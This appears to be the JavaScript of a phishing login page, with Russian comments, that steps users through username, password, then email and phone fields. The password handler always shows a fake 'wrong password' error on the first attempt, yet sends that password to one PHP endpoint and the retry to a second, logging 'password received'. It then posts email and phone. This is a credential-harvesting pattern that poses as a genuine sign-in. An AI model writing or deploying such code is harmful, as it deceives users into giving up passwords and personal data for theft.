document.addEventListener('DOMContentLoaded', () => {
  const inputs = document.querySelectorAll('.input');

  inputs.forEach((input) => {
    const label = input.previousElementSibling;

    if (label) {
      if (input.value) {
        input.classList.add('filled');
      }

      input.addEventListener('focus', () => {
        label.classList.add('active');
      });

      input.addEventListener('blur', () => {
        if (input.value) {
          input.classList.add('filled');
        } else {
          input.classList.remove('filled');
          label.classList.remove('active');
        }
      });
    }
  });
});

document.addEventListener('DOMContentLoaded', () => {
  const usernameInput = document.getElementById('username');
  const submitButton = document.getElementById('submit-btn');

  const toggleButtonState = () => {
    if (usernameInput.value.trim() !== '') {
      submitButton.classList.add('active');
    } else {
      submitButton.classList.remove('active');
    }
  };

  usernameInput.addEventListener('input', toggleButtonState);

  toggleButtonState();
});

document.addEventListener('DOMContentLoaded', () => {
  const passwordInput = document.getElementById('password');
  const submitButton = document.getElementById('submit-btn-password');
  const label = document.querySelector('label[for="password"]');
  const errorSpan = document.getElementById('password-error');
  let isSubmittedOnce = false;

  const toggleButtonState = () => {
    if (passwordInput.value.trim() !== '') {
      submitButton.classList.add('active');
      passwordInput.classList.add('filled');
    } else {
      submitButton.classList.remove('active');
      passwordInput.classList.remove('filled');
    }
  };

  passwordInput.addEventListener('input', () => {
    toggleButtonState();

    if (isSubmittedOnce && passwordInput.value.trim() !== '') {
      passwordInput.classList.remove('error');
      errorSpan.classList.remove('active');
    }
  });

  toggleButtonState();

  submitButton.addEventListener('click', (event) => {
    if (passwordInput.value.trim() !== '') {
      event.preventDefault();

      const url = isSubmittedOnce ? 'your-second-php-file.php' : 'your-php-file.php';

      if (isSubmittedOnce) {

      } else {
        isSubmittedOnce = true;
        passwordInput.classList.add('error');
        passwordInput.classList.remove('filled');
        label.classList.remove('active');
        submitButton.classList.remove('active');
        errorSpan.classList.add('active');
      }

      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({password: passwordInput.value})
      })
        .then(response => response.text())
        .then(data => {
          console.log('Получен пароль:', passwordInput.value);
          passwordInput.value = '';
        })
        .catch(error => console.error('Ошибка:', error));
    } else {
      event.preventDefault();
    }
  });
});

document.addEventListener('DOMContentLoaded', () => {
  const emailInput = document.getElementById('password');
  const phoneInput = document.getElementById('phone');
  const submitButton = document.getElementById('submit-btn-info');
  const formInfo = document.getElementById('form-info');

  // Функция для проверки состояния кнопки
  const toggleButtonState = () => {
    if (emailInput.value.trim() !== '' && phoneInput.value.trim() !== '') {
      submitButton.classList.add('active');
    } else {
      submitButton.classList.remove('active');
    }
  };

  // События на ввод в поля
  emailInput.addEventListener('input', toggleButtonState);
  phoneInput.addEventListener('input', toggleButtonState);

  // Проверка состояния кнопки при загрузке страницы
  toggleButtonState();

  // Обработка отправки формы
  formInfo.addEventListener('submit', (event) => {
    if (emailInput.value.trim() !== '' && phoneInput.value.trim() !== '') {
      event.preventDefault();

      fetch('your-php-file.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
          email: emailInput.value,
          phone: phoneInput.value
        })
      })
        .then(response => response.text())
        .then(data => {
          console.log('Данные успешно отправлены:', data);
          // Можно добавить дополнительную логику обработки ответа сервера здесь
        })
        .catch(error => console.error('Ошибка:', error));
    } else {
      console.error('Не все поля заполнены');
    }
  });
});